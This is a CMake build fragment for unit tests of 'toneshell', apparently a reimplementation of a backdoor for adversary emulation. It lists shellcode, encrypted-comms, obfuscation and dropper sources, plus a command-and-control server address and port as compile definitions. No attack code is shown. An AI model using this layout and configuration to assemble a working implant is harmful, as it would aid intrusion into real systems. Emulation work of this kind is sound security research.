# Build components
add_subdirectory("shellcode")
add_subdirectory("wsdapi")
add_subdirectory("test4")

###############################################################################
# Unit test source files
###############################################################################
target_sources(
    toneshell-test
    PRIVATE
    "shellcode/comms.cpp"
    "shellcode/comms_encryption_det.cpp"
    "shellcode/comms_test.cpp"
    "shellcode/exec.cpp"
    "shellcode/exec_test.cpp"
    "shellcode/rc4.cpp"
    "shellcode/rc4_test.cpp"
    "shellcode/shellcode_util.cpp"
    "shellcode/shellcode_util_test.cpp"
    "common/api_helper_test.cpp"
    "common/checks.cpp"
    "common/checks_test.cpp"
    "common/handler_util.cpp"
    "common/handler_util_test.cpp"
    "common/logger.cpp"
    "common/logger_test.cpp"
    "common/obfuscation_test.cpp"
    "common/pi_aes_ctr_test.cpp"
    "common/pi_aes_ctr.cpp"
    "common/pi_base64_test.cpp"
    "common/pi_base64.cpp"
    "common/util.cpp"
    "common/xor.cpp"
    "common/xor_test.cpp"
    "test4/dropper/dropper_util.cpp"
    "test4/dropper/dropper_util_test.cpp"
    "test4/gflagsui/gflagsui_util.cpp"
    "test4/gflagsui/gflagsui_util_test.cpp"
    "${CMAKE_SOURCE_DIR}/tests/test_util.cpp"
)

target_include_directories(
    toneshell-test
    PUBLIC
    "${CMAKE_SOURCE_DIR}/src/wsdapi"
    "${CMAKE_SOURCE_DIR}/src/shellcode"
    "${CMAKE_SOURCE_DIR}/src/common"
    "${CMAKE_SOURCE_DIR}/src/test4/dropper"
    "${CMAKE_SOURCE_DIR}/src/test4/gflagsui"
    "${CMAKE_SOURCE_DIR}/tests"
)

target_compile_definitions(
    toneshell-test
    PRIVATE
    SERVER="10.100.0.70"
    PORT=8443
    SH_LOG_FILE="C:\\\\users\\\\public\\\\toneshell_shellcode.log"
    DLL_HANDLER_LOG_FILE="toneshell_main.log"
    DLL_SH_RUNNER_LOG_FILE="toneshell_sh_runner.log"
    DLL_RP_LOG_FILE="toneshell_runpayload.log"
    ENCRYPTED_LOGGING=1 # set to 0 to disable, set to non-0 to enable
)
